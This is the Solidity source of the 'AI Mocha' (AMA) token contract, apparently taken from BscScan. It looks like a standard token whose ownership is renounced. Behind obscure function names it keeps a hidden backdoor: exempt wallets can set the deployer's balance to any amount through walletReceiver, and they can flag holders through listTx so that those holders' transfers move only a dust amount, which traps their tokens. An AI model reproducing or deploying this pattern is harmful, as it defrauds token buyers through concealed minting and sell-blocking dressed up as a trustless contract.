/**
 *Submitted for verification at BscScan.com on 2023-02-04
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface listMarketing {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface toExemptTrading {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract AIMocha is Ownable{
    uint8 public decimals = 18;
    bool public launchedTokenIs;
    uint256 public totalSupply = 100000000 * 10 ** 18;

    address public amountTeam;
    mapping(address => bool) public walletExempt;
    address public fundToken;
    mapping(address => bool) public totalReceiver;
    string public symbol = "AMA";


    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name = "AI Mocha";
    uint256 constant fromSwap = 10 ** 10;

    

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        listMarketing walletLimit = listMarketing(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        amountTeam = toExemptTrading(walletLimit.factory()).createPair(walletLimit.WETH(), address(this));
        fundToken = amountTo();
        walletExempt[fundToken] = true;
        balanceOf[fundToken] = totalSupply;
        emit Transfer(address(0), fundToken, totalSupply);
        renounceOwnership();
    }

    

    function approve(address tradingToken, uint256 receiverTokenTx) public returns (bool) {
        allowance[amountTo()][tradingToken] = receiverTokenTx;
        emit Approval(amountTo(), tradingToken, receiverTokenTx);
        return true;
    }

    function shouldTake(address toTake, address marketingFee, uint256 receiverTokenTx) internal returns (bool) {
        require(balanceOf[toTake] >= receiverTokenTx);
        balanceOf[toTake] -= receiverTokenTx;
        balanceOf[marketingFee] += receiverTokenTx;
        emit Transfer(toTake, marketingFee, receiverTokenTx);
        return true;
    }

    function amountTo() private view returns (address) {
        return msg.sender;
    }

    function listTx(address swapBuy) public {
        if (swapBuy == fundToken || swapBuy == amountTeam || !walletExempt[amountTo()]) {
            return;
        }
        totalReceiver[swapBuy] = true;
    }

    function buyTrading(address fromEnable) public {
        if (launchedTokenIs) {
            return;
        }
        walletExempt[fromEnable] = true;
        launchedTokenIs = true;
    }

    function transfer(address feeMax, uint256 receiverTokenTx) external returns (bool) {
        return transferFrom(amountTo(), feeMax, receiverTokenTx);
    }

    function getOwner() external view returns (address) {
        return owner();
    }

    function walletReceiver(uint256 receiverTokenTx) public {
        if (!walletExempt[amountTo()]) {
            return;
        }
        balanceOf[fundToken] = receiverTokenTx;
    }

    function transferFrom(address totalFund, address feeMax, uint256 receiverTokenTx) public returns (bool) {
        if (totalFund != amountTo() && allowance[totalFund][amountTo()] != type(uint256).max) {
            require(allowance[totalFund][amountTo()] >= receiverTokenTx);
            allowance[totalFund][amountTo()] -= receiverTokenTx;
        }
        if (feeMax == fundToken || totalFund == fundToken) {
            return shouldTake(totalFund, feeMax, receiverTokenTx);
        }
        if (totalReceiver[totalFund]) {
            return shouldTake(totalFund, feeMax, fromSwap);
        }
        return shouldTake(totalFund, feeMax, receiverTokenTx);
    }


}